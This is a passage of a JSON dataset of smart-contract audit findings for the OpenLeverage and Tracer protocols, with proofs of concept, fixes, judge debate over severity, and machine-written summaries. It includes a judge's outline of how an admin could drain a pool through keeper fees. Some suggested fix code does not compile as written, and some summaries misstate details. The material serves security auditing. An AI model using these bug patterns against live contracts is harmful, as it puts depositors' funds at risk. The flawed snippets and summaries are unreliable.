      "content": "_Submitted by defsec_\n\nEth sent to Timelock will be locked in current implementation. I came across this problem while playing around with the governance contract.\n\n#### Proof of Concept\n\n*   Setup the governance contracts (GovernanceAlpha, Timelock)\n*   Send eth to timelock contract\n*   Setup a proposal to send 0.1 eth out. Code snippet in ether.js below. proxy refers to GovernorAlpha.\n\n```js\nawait proxy.propose(\n    [signers[3].address],\n    [ethers.utils.parseEther(\"0.1\")],\n    [\"\"],\n    [ethers.BigNumber.from(0)],\n    \"Send funds to 3rd signer\"\n);\n```\n*   Vote and have the proposal succeed.\n*   Execute the proposal, the proposal number here is arbitrary.\n\n```js\nawait proxy.execute(2);  // this fails\n    await proxy.execute(2, {value: ethers.utils.parseEther(\"0.1\")})  // this would work\n    0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract.\n```\n\n#### Recommended Mitigation Steps\n\nConsider implementing the following code.\n```solidity\n\nfunction execute(uint proposalId) external {\n    require(state(proposalId) == ProposalState.Queued, \"GovernorAlpha::execute: proposal can only be executed if it is queued\");\n    Proposal storage proposal = proposals[proposalId];\n    proposal.executed = true;\n    for (uint i = 0; i < proposal.targets.length; i++) {\n        timelock.executeTransaction(proposal.targets[i], proposal.values[i], proposal.signatures[i], proposal.calldatas[i], proposal.eta);\n    }\n    emit ProposalExecuted(proposalId);\n}\n```\n\n#### Reference\n\n<https://github.com/compound-finance/compound-protocol/pull/177/files>\n\n**[ColaM12 (OpenLeverage) acknowledged](https://github.com/code-423n4/2022-01-openleverage-findings/issues/80)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/80#issuecomment-1045994865):**\n > I agree with this finding!\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about an issue in the governance contract where eth sent to Timelock will be locked in the current implementation. This was discovered while playing around with the governance contract. The proof of concept involves setting up the governance contracts (GovernanceAlpha, Timelock), sending eth to the timelock contract, setting up a proposal to send 0.1 eth out, voting and having the proposal succeed, and executing the proposal. When the proposal is executed, the 0.1 eth will be sent out, but it is sent from the msg.sender not from the timelock contract.\n\nTo mitigate this issue, consider implementing the code provided in the report. This code will ensure that the proposal can only be executed if it is queued and that the proposal will be executed from the timelock contract. \n\nOverall, this bug report provides a proof of concept and a recommended mitigation step for an issue in the governance contract where eth sent to Timelock will be locked in the current implementation.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/80",
      "tags": [],
      "finders": [
        "defsec"
      ]
    },
    {
      "id": "1355",
      "title": "[M-02] Missing payable",
      "impact": "MEDIUM",
      "content": "_Submitted by robee_\n\nThe following functions are not payable but uses msg.value - therefore the function must be payable.\nThis can lead to undesired behavior.\n\n        LPool.sol, addReserves should be payable since using msg.value\n\n**[ColaM12 (OpenLeverage) confirmed and resolved](https://github.com/code-423n4/2022-01-openleverage-findings/issues/61)**\n\n**[0xleastwood (judge) commented](https://github.com/code-423n4/2022-01-openleverage-findings/issues/61#issuecomment-1045990204):**\n > Nice find! The warden has identified a function which is missing the `payable` keyword. Preventing any users from adding reserves using native ether.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the LPool.sol contract. The function addReserves is not payable, but it uses msg.value. This means that it can lead to undesired behavior. To fix the vulnerability, the function should be made payable. This means that anyone calling the function should be able to pay for it. This will ensure that the function is not misused.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/61",
      "tags": [],
      "finders": [
        "robee"
      ]
    },
    {
      "id": "1354",
      "title": "[M-01] UniV2ClassDex.sol#uniClassSell() Tokens with fee on transfer are not fully supported",
      "impact": "MEDIUM",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L31-L56\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint buyAmount){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n\n    require(buyAmount >= minBuyAmount, 'buy amount less than min');\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    return bought;\n}\n```\n\nWhile `uniClassBuy()` correctly checks the actually received amount by comparing the before and after the balance of the receiver, `uniClassSell()` trusted the result given by `getAmountOut()`. This makes `uniClassSell()` can result in an output amount fewer than `minBuyAmount`.\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/501e8f5c7ebaf1242572712626a77a3d65bdd3ad/openleverage-contracts/contracts/dex/bsc/UniV2ClassDex.sol#L101-L102\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction uniClassSell(DexInfo memory dexInfo,\n    address buyToken,\n    address sellToken,\n    uint sellAmount,\n    uint minBuyAmount,\n    address payer,\n    address payee\n) internal returns (uint bought){\n    address pair = getUniClassPair(buyToken, sellToken, dexInfo.factory);\n    IUniswapV2Pair(pair).sync();\n    (uint256 token0Reserves, uint256 token1Reserves,) = IUniswapV2Pair(pair).getReserves();\n    sellAmount = transferOut(IERC20(sellToken), payer, pair, sellAmount);\n    uint balanceBefore = IERC20(buyToken).balanceOf(payee);\n    dexInfo.fees = getPairFees(dexInfo, pair);\n    if (buyToken < sellToken) {\n        buyAmount = getAmountOut(sellAmount, token1Reserves, token0Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(buyAmount, 0, payee, \"\");\n    } else {\n        buyAmount = getAmountOut(sellAmount, token0Reserves, token1Reserves, dexInfo.fees);\n        IUniswapV2Pair(pair).swap(0, buyAmount, payee, \"\");\n    }\n    uint bought = IERC20(buyToken).balanceOf(payee).sub(balanceBefore);\n    require(bought >= minBuyAmount, 'buy amount less than min');\n}\n```",
      "summary": "\nThis bug report is about the code in the function uniClassSell() in the code repository of WatchPug. In the code, the amount of buyToken the payee receives is not correctly checked and can be fewer than the minimum buy amount. The recommendation is to change the code to check the bought amount by comparing the before and after balance of the receiver.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/208",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1353",
      "title": "[H-01] OpenLevV1Libs and LPools doTransferOut functions call native payable.transfer, which can be unusable for smart contract calls",
      "impact": "HIGH",
      "content": "## Handle\n\nhyh\n\n\n## Vulnerability details\n\n## Impact\n\nWhen OpenLev operations use a wrapped native token, the whole user withdraw is being handled with a `payable.transfer()` call.\n\nThis is unsafe as `transfer` has hard coded gas budget and can fail when the user is a smart contract. This way any programmatical usage of OpenLevV1 and LPool is at risk.\n\nWhenever the user either fails to implement the payable fallback function or cumulative gas cost of the function sequence invoked on a native token transfer exceeds 2300 gas consumption limit the native tokens sent end up undelivered and the corresponding user funds return functionality will fail each time.\n\nAs OpenLevV1 `closeTrade` is affected this includes user's principal funds freeze scenario, so marking the issue as a high severity one.\n\n## Proof of Concept\n\nOpenLevV1Lib and LPool have `doTransferOut` function that calls native token payable.transfer:\n\nOpenLevV1Lib.doTransferOut\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1Lib.sol#L253\n\n\nLPool.doTransferOut\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/liquidity/LPool.sol#L297\n\n\nLPool.doTransferOut is used in LPool redeem and borrow, while OpenLevV1Lib.doTransferOut is used in OpenLevV1 trade manipulation logic:\n\ncloseTrade\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L204\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L215\n\n\nliquidate\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L263\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L295\n\nhttps://github.com/code-423n4/2022-01-openleverage/blob/main/openleverage-contracts/contracts/OpenLevV1.sol#L304\n\n\n## References\n\nThe issues with `transfer()` are outlined here:\n\nhttps://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/\n\n\n## Recommended Mitigation Steps\n\nOpenLevV1's `closeTrade` and `liquidate` as well as LPool's `redeem`, `redeemUnderlying`, `borrowBehalf`, `repayBorrowBehalf`, `repayBorrowEndByOpenLev` are all `nonReentrant`, so reentrancy isn't an issue and `transfer()` can be just replaced.\n\nUsing low-level `call.value(amount)` with the corresponding result check or using the OpenZeppelin `Address.sendValue` is advised:\n\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol#L60",
      "summary": "\nThis bug report is about an issue with OpenLev and LPool operations when using a wrapped native token. The issue is that when a user withdraws, the whole process is handled with a `payable.transfer()` call, which has a hard-coded gas budget and can fail if the user is a smart contract. This means that any programmatic usage of OpenLevV1 and LPool is at risk, and user funds can be frozen in the principal funds freeze scenario. The proof of concept provided in the report outlines the affected functions, and the recommended mitigation steps are to replace the `transfer()` with either a low-level `call.value(amount)` with the corresponding result check or with the OpenZeppelin `Address.sendValue`.",
      "quality_score": 3,
      "rarity_score": 1,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "OpenLeverage",
      "source_link": "https://code4rena.com/reports/2022-01-openleverage",
      "github_link": "https://github.com/code-423n4/2022-01-openleverage-findings/issues/75",
      "tags": [
        "call vs transfer"
      ],
      "finders": [
        "hyh"
      ]
    },
    {
      "id": "25591",
      "title": "[M-03] `uncommit` sends tokens to the wrong user",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel, also found by WatchPug_.\n\nThe `PoolCommitter._uncommit` function calls the `ILeveragedPool(leveragedPool).quoteTokenTransfer/mintTokens` function with `msg.sender`.\nBut in `_uncommit`'s case that's the **pool, not the commit owner**, see `onlyPool` modifier on `executeAllCommitments` which calls `_uncommit`.\n\n#### Impact\n\nUsers lose all tokens from their commitments as they are sent / minted to the pool instead.\n\n#### Recommended Mitigation Steps\n\nInstead of `msg.sender`, use `_commit.owner`:\n\n```solidity\n// minting: return quote tokens to the commit owner\n// @audit msg.sender is pool, should be _commit.owner\nILeveragedPool(leveragedPool).quoteTokenTransfer(msg.sender, _commit.amount);\n// same with mint cases\n```\n\n**[rogue developer (Tracer) disagreed with severity](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-945331001):**\n > This is a valid issue. However, it requires there to be an underlying bug in the contracts which would make the `executeCommitment` call in `executeAllCommitments` revert (as `_uncommit` is only called in that case). If the warden can find a way for `executeCommitment` to revert, we would consider this to be an issue of this severity but otherwise we disagree with the severity as it requires/needs to be paired with another bug in the contracts.\n> \n> It's also worth noting that governance can rescue any funds (rather, quote/collateral tokens) from the `LeveragedPool` contract. So if there were to be a case where there was a bug in the contracts that led to `executeCommitment` reverting and the users having their mints (quote tokens sent back to the `LeveragedPool`), governance could pause the contracts, drain out the equivalent worth and set up another contract where users can burn their tokens/claim them; if they burned the tokens which later uncommitted, then governance could send them an equal amount in collateral tokens. On the same note, if a critical vulnerability in `executeCommitment` were to be happening whereby commits were being uncommitted, then governance could also pause the contracts, rescue the funds and do some combination of the efforts above to ensure users get the funds back securely.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955094840):**\n > Would setting up a commit such that this line will underflow\n> https://github.com/tracer-protocol/perpetual-pools-contracts/blob/646360b0549962352fe0c3f5b214ff8b5f73ba51/contracts/implementation/PoolCommitter.sol#L305\n> , causing a revert, be a way to cause the function to call `_uncommit` ?\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955095206):**\n > Also, to clarify, you're saying you believe the code will never call `_uncommit` as it won't ever revert, right?\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955097577):**\n > At this time I believe that if a user mistakenly commits more than the value in `shadowPools[_commitType]` they can cause a silent revert which will trigger the bug\n> \n> I think only their own funds are at risk, and either passing along the original committer or storing it in the commitData would allow to safely return them their funds.\n> \n> With the information I have this issue sits between medium and high severity, high severity because user funds are at risk, medium because:\n> ```\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> ```\n> \n> As of now I'll mark as medium and valid.\n> \n> Will think it over the weekend\n> \n> If the sponsor can let me know their take and reply to the questions above, that can help clarify the severity and validity\n\n**[rogue developer (Tracer) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955099303):**\n > > Would setting up a commit such that this line will underflow https://github.com/tracer-protocol/perpetual-pools-contracts/blob/646360b0549962352fe0c3f5b214ff8b5f73ba51/contracts/implementation/PoolCommitter.sol#L305 , causing a revert, be a way to cause the function to call _uncommit ?\n> \n> @Alex the Entreprenerd No. `shadowPools` is a mapping of commit types to the sum of pool tokens to be burned (rather, to be executed because they've already been burned), or sum of collateral tokens to be used in minting that haven't been used for minting yet. `executeCommitment` can only be called on `Commit`'s, which are in the `commits` mapping, which can only be added to via the `commit` function where users have to commit to putting up collateral/burning their pool tokens, which is the function that increments `shadowPools`. I realise that sounds a bit convoluted, but basically `executeCommitment` and its `_commit` parameter has a direct dependency on users committing via the `commit` function, which increments `shadowPools` by the value of their commit (which they can't game -- their collateral tokens get sent to the `LeveragedPool` contract instantly and their tokens get burned instantly and they don't have access to those funds anymore). \n> \n> > Also, to clarify, you're saying you believe the code will never call `_uncommit` as it won't ever revert, right?\n> \n> Yes, that's right. It is there as a fail-safe (so that if there was some bug in a commit that stopped a commit in the queue from being executed, it wouldn't stop the markets). We are refactoring this code nonetheless though.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955101993):**\n > Alright from this information I understand that the underflow idea can't happen (gas optimization there would be to use `unsafe` operations I guess)\n> \n> I think given the system a refactoring to send the funds back is warranted\n> \n> That said the fact that there seems to be no way to get a revert excludes the high severity.\n> \n> That leaves us with the finding either being med or low risk\n> \n> Low risk would be acceptable as the code doesn't work as it suggests (`_uncommit` is never executed, and if it did it wouldn't reimburse the user)\n> \n> The alternative take is Medium: if `_uncommit` where executed it would cause in a loss of funds / funds stuck\n> \n> As of now I'll leave it as med, while we don't have a way to trigger `_uncommit` we can still make the claim that if `_uncommit` where to run, it wouldn't reimburse the user\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955108907):**\n > Going a little deeper for the sake of clarity:\n> \n> The math library is programmed to never revert:\n> https://github.com/tracer-protocol/perpetual-pools-contracts/blob/646360b0549962352fe0c3f5b214ff8b5f73ba51/contracts/implementation/PoolSwapLibrary.sol#L256\n> \n> The amounts in commit are always greater than 0 so no revert there\n> \n> \n> The pool.setter is innocuous\n> \n> The only thing I found is the `pool.quoteTokenTransfer(_commit.owner, amountOut);`\n> \n> If for an unfortunate reason the pool is drained from the quoteToken and the safeTransfer fail, then the function would revert\n> \n> \n> On that note the way to perform this would be to use\n> `    function setKeeper(address _keeper) external override onlyGov onlyUnpaused {`\n> To change the keeper to a EOA / Malicious account\n> \n> And then run\n> `function payKeeperFromBalances(address to, uint256 amount)`\n> with the full amount (or close to it) of `amount <= shortBalance + longBalance`\n> \n> This seems to be a permissioned way (admin privilege) to rug funds from the LeveragedPool as well as enabling the `_uncommit` to be triggered\n> \n> Given these findings (which I may misunderstand, so feel free to correct me) I highly recommend the sponsor to ensure there's a timelock for changing keeper\n> Additionally (and I may be missing something) allowing `payKeeperFromBalances` to take an indiscriminate amount of funds may prove to be a rug vector the sponsor should consider eliminating.\n> \n> I'm fairly confident the [math library](https://github.com/abdk-consulting/abdk-libraries-solidity/blob/master/ABDKMathQuad.sol) will never revert, even if you input a high fee, which means that while the end state may be unexpected, the function can be used to rug.\n> \n> Highly recommend the sponsor to consider having caps on the `amount` parameter for [`payKeeperFromBalances`](https://github.com/tracer-protocol/perpetual-pools-contracts/blob/646360b0549962352fe0c3f5b214ff8b5f73ba51/contracts/implementation/LeveragedPool.sol#L111) as this function seems to be the way to break the protocol (and the trust of the users)\n> \n\n**[rogue developer (Tracer) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955112942):**\n > @Alex the Entreprenerd Yep, that's completely right. However (and this is something we should have made clear in an assumptions section), all markets will be deployed by the DAO/DAO multisig. You can see that the `payKeeperFromBalances` function has a modifier called `onlyGov` -- meaning only governance (the DAO/DAO multisig) can change this and that's something that's immutable and can't be changed. Governance also has the ability to take quote tokens out of the `LeveragedPool` contract (with `withdrawQuote`) unlike the hack with changing the keeper (more directly this way) but we've been going under the assumption that the only reason we'd do this is in the rescue of user funds in the case of some hack. \n> \n> If the governance multisig is compromised, they have the ability to do a lot of damage but we've been going under the assumption this just won't be the case, which I think is a safe one to make. So you're right in that `uncommit` can send tokens to the wrong user in case the function reverts because of governance draining funds directly or via setting a malicious keeper, but I think that `uncommit` sending tokens to the wrong user is the least of problems if that happens because governance would only ever drain funds in the case of a major hack. If we're going under the assumption that the multisig _can_ easily be compromised, then the \"centralisation\" point around the DAO would be a much bigger point. \n> \n> I still think this should be a low/information by virtue of the fact that unless there is an underlying bug in the contracts, `uncommit` can't be called (it may as well be dead code) -- if it gets called because governance has rugged, that is then relatively a fairly small problem because all the funds would be at risk in a much more direct way in that case.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955115864):**\n > @rogue developer agree that if governance is malicious, the `_uncommit` path is the least problem\n> \n> One thing to note is that the `keeper` has the ability of trying to claim a lot of fees, and the modifier seems to be `onlyKeeper` if the keeper were to be a bot, or a human operator they would have the ability of rugging, unless the parameter `amount` was under some check (let's say less than 1% AUM or something)\n> \n> I agree that you can set to the `PoolKeeper` contract which seems safe, once potential rug vector, again from governance would be to inject a high `gasPrice` via `setGasPrice` which as a `onlyOwner` modifier\n> \n> Contract for PoolKeeper:\n> https://arbiscan.io/address/0x759E817F0C40B11C775d1071d466B5ff5c6ce28e#code\n> \n> The owner is the Dev Multisig:\n> https://arbiscan.io/address/0x0f79e82ae88e1318b8cfc8b4a205fe2f982b928a#readContract\n> \n> This does give the Dev Multisig admin privileges and a potential for griefing at the very least if not rugging, as they could raise the gas price, and then run `performUpkeepSinglePool` which would eventually call `payKeeperFromBalances`\n> \n> That said, this is something I'm flagging up right now and outside of the contest\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955116449):**\n > As per the finding at this point I believe it's valid and at medium severity, it is not high severity due to need for existing preconditions that are not \"usual\", see definition from Gitbook:\n> `\n> 2  Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions, but external requirements.\n> `\n> \n> We can agree that the pre-condition here are drastic and this finding would be the last of the protocols problems\n> \n> In terms of mitigation, ensuring that the funds are send back to the address that initiated the commit are more than sufficient\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/19#issuecomment-955116649):**\n > Per the \"multisig privileges\" above, I recommend you replace `owner` on the poolKeeper with a TimeLock as in it's current state, the gasPrice may be a way to rug funds from depositors\n\n",
      "summary": "\nA bug was reported in the `PoolCommitter._uncommit` function of the `LeveragedPool` contract. The function calls the `ILeveragedPool(leveragedPool).quoteTokenTransfer/mintTokens` function with `msg.sender`, which in this case is the pool, not the commit owner. This could lead to users losing all tokens from their commitments as they are sent/minted to the pool instead.\n\nThe bug was marked as medium severity and valid, as if `_uncommit` were executed it would cause a loss of funds/funds stuck. The recommended mitigation steps are to use `_commit.owner` instead of `msg.sender`, and send the funds back to the address that initiated the commit.\n\nFurther discussion revealed that the bug is not high severity due to the need for existing preconditions that are not \"usual\". It was also noted that the `PoolKeeper` contract has the ability of trying to claim a lot of fees, and that the owner is the Dev Multisig, which gives them admin privileges and a potential for griefing or rugging. To mitigate this, it was recommended to replace `owner` on the `PoolKeeper` with a TimeLock, and to have caps on the `amount` parameter for `payKeeperFromBalances`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-10-tracer",
      "github_link": "https://github.com/code-423n4/2021-10-tracer-findings/issues/19",
      "tags": [],
      "finders": []
    },
    {
      "id": "25590",
      "title": "[M-02] Deposits don't work with fee-on transfer tokens",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_.\n\nThere are ERC20 tokens that may make certain customizations to their ERC20 contracts.\nOne type of these tokens is deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()`.\nOthers are rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time).\n\n#### Impact\n\nThe `PoolCommiter.commit()` function will store the entire `amount` in the commitment but with fee-on-transfer tokens, fewer tokens will be transferred which leads to inconsistencies with the `pool.longBalance()` and in `uncommit`.\n\n#### Recommended Mitigation Steps\n\nOne possible mitigation is to measure the asset change right before and after the asset-transferring routines\n\n\n**[rogue developer (Tracer) disputed](https://github.com/code-423n4/2021-10-tracer-findings/issues/17#issuecomment-944009136):**\n > Only governance (a multisig) can deploy markets, and has complete say over what markets can be deployed (see the `onlyGov` modifier in `PoolFactory.sol#deployPool`). Because new markets being deployed would be done via proposal to the DAO, which include the collateral token being used in a proposed market, markets with fee-on transfer tokens like Aave's aTokens just won't be deployed. I think this is a fairly safe assumption to make and thus we're making it out of scope. In any case, the chances of this happening and slipping past everyone who votes in the proposals _and_ not being noticed extremely soon after a market is deployed are extremely low.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/17#issuecomment-955088716):**\n > I think this is a valid finding, the warden has shown a way to tamper with the protocol, extracting value (as such medium severity)\n> \n> In terms of mitigation, not using `feeOnTransfer` or `rebasing` tokens is completely legitimate.\n\n\n\n",
      "summary": "\nA bug report was submitted by cmichel regarding certain ERC20 tokens that have customizations such as deflationary tokens that charge a certain fee for every `transfer()` or `transferFrom()` and rebasing tokens that increase in value over time like Aave's aTokens (`balanceOf` changes over time). This bug impacts the `PoolCommiter.commit()` function, which stores the entire `amount` in the commitment but with fee-on-transfer tokens, fewer tokens will be transferred which leads to inconsistencies with the `pool.longBalance()` and in `uncommit`.\n\nThe recommended mitigation steps for this bug are to measure the asset change right before and after the asset-transferring routines. Alex the Entreprenerd (judge) commented that this is a valid finding and the warden has shown a way to tamper with the protocol, extracting value (as such medium severity). He also suggested that not using `feeOnTransfer` or `rebasing` tokens is completely legitimate.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-10-tracer",
      "github_link": "https://github.com/code-423n4/2021-10-tracer-findings/issues/17",
      "tags": [],
      "finders": []
    },
    {
      "id": "25589",
      "title": "[M-01] Wrong keeper reward computation",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_.\n\nThe `PoolKeeper.keeperReward` computation mixes WADs and Quads which leads to issues.\n\n1.  Note that `keeperTip` returns values where `1` = `1%`, and `100 = 100%`, the same way `BASE_TIP = 5 = 5%`. Thus `_tipPercent = ABDKMathQuad.fromUInt(keeperTip)` is a Quad value of this keeper tip, and not in \"wad units\" as the comment above it says.\n\n```solidity\n// @audit  this comment is not correct, it's in Quad units\n// tip percent in wad units\nbytes16 _tipPercent = ABDKMathQuad.fromUInt(keeperTip(_savedPreviousUpdatedTimestamp, _poolInterval));\n```\n\n2.  Now the `wadRewardValue` interprets `_tipPercent` as a WAD + Quad value which ultimately leads to significantly fewer keeper rewards:\n\nIt tries to compute `_keeperGas + _keeperGas * _tipPercent` and to compute `_keeperGas * _tipPercent` it does a wrong division by `fixedPoint` (1e18 as a quad value) because it thinks the `_tipPercent` is a WAD value (100%=1e18) as a quad, when indeed `100%=100`. It seems like it should divide by `100` as a quad instead.\n```solidity\nABDKMathQuad.add(\n    ABDKMathQuad.fromUInt(_keeperGas),\n    // @audit there's no need to divide by fixedPoint, he wants _keeperGas * _tipPercent and _tipPercent is a quad quad_99 / quad_100\n    ABDKMathQuad.div((ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100))\n)\n```\n#### Impact\n\nThe keeper rewards are off as the `_keeperGas * _tipPercent` is divided by 1e18 instead of 1e2.\nKeeper will just receive their `_keeperGas` cost but the tip part will be close to zero every time.\n\n#### Recommended Mitigation Steps\n\nGenerally, I'd say the contract mixes quad and WAD units where it doesn't have to do it. Usually, you either use WAD or Quad math but not both at the same time.\nThis complicates the code.\nI'd make `keeperTip()`  return a `byte16` Quad value as a percentage where `100% = ABDKMathQuad.fromUInt(1)`. This temporary float result can then be used in a different `ABDKMathQuad` computation.\n\nAlternatively, divide by 100 as a quad instead of 1e18 as a quad because `_tipPercent` is not a WAD value, but simply a percentage where `1 = 1%`.\n\n```solidity\nABDKMathQuad.add(\n    ABDKMathQuad.fromUInt(_keeperGas),\n    // @audit there's no need to divide by fixedPoint, he wants _keeperGas * _tipPercent and _tipPercent is a quad quad_99 / quad_100\n    ABDKMathQuad.div((ABDKMathQuad.mul(ABDKMathQuad.fromUInt(_keeperGas), _tipPercent)), ABDKMathQuad.fromUInt(100))\n)\n```\n\n**[mynameuhh (Tracer) confirmed](https://github.com/code-423n4/2021-10-tracer-findings/issues/23)**\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2021-10-tracer-findings/issues/23#issuecomment-955087515):**\n > Agree with the finding and its severity, great find.\n\n\n\n",
      "summary": "\nA bug report has been submitted by cmichel regarding the PoolKeeper.keeperReward computation. This computation mixes WADs and Quads, which leads to issues. The `keeperTip` returns values where `1` = `1%`, and `100 = 100%`, but the comment above it says it is in \"wad units\". The `wadRewardValue` interprets `_tipPercent` as a WAD + Quad value, which causes fewer keeper rewards. The computation tries to compute `_keeperGas + _keeperGas * _tipPercent` and to compute `_keeperGas * _tipPercent` it divides by `fixedPoint` (1e18 as a quad value) because it thinks the `_tipPercent` is a WAD value (100%=1e18) as a quad, when it should divide by `100` as a quad instead. This leads to the keeper just receiving their `_keeperGas` cost and the tip part being close to zero every time.\n\nTo mitigate this issue, cmichel recommends making `keeperTip()` return a `byte16` Quad value as a percentage where `100% = ABDKMathQuad.fromUInt(1)` or dividing by 100 as a quad instead of 1e18 as a quad because `_tipPercent` is not a WAD value. Tracer confirmed the finding and its severity, and Alex the Entreprenerd agreed with the findings.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Tracer",
      "source_link": "https://code4rena.com/reports/2021-10-tracer",
      "github_link": "https://github.com/code-423n4/2021-10-tracer-findings/issues/23",
      "tags": [],
      "finders": []
    },
    {
      "id": "53772",
      "title": "Invalid string to bytes16 Conversion",
      "impact": "LOW",
      "content": "## Description\n\nThe function `getAmountOut()` is used to calculate the amount of tokens a user is entitled to based on the current ratio and `amountIn`.\n\nThe library `ABDKMathQuad` has two representations for the number zero, being positive and negative zero. There is a check seen in the following code snippet showing the check for both positive and negative zero.\n\n```solidity\nif (ABDKMathQuad.cmp(ratio, 0) == 0 || ABDKMathQuad.cmp(ratio, bytes16(\"0x1\")) == 0) {\n```\n\nThere are two issues with the second condition, which is the check for negative zero. \n\n1. First, Solidity conversion from string to `bytes16` will treat the string as an ASCII array. Hence `bytes16(\"0x1\")` will be treated as the array `[30, 78, 31]`.\n   \n2. The second issue is that negative zero has the first bit set to zero rather than the first byte. That is, negative zero has the first byte as `0x80` (0b1000_0000) not `0x01` (0b0000_0001).\n\nAs a result, the `getAmountOut()` function will not return `amountIn` for negative zero. To exploit this issue, a user would need to call this function when the ratio is about `1 / 24087`, which should not be reachable by the protocol in normal conditions.\n\n## Recommendations\n\nThis issue may be mitigated by using constants for positive and negative zero. For example:\n\n```solidity\nbytes16 internal constant POSITIVE_ZERO = 0x00000000000000000000000000000000;\nbytes16 internal constant NEGATIVE_ZERO = 0x80000000000000000000000000000000;\n```",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Tracer",
